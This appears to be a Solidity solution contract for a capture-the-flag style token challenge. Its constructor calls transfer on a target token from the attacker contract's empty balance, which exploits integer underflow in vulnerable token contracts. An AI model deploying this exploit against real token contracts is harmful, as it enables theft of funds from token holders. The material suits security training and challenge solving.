// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

interface IToken {
    function transfer(address _to, uint _value) external  returns (bool);
    function balanceOf(address _owner) external  view returns (uint balance);
}


contract  Hack {
   
    constructor(address _target) {
        IToken(_target).transfer(msg.sender, 1);
    }
}

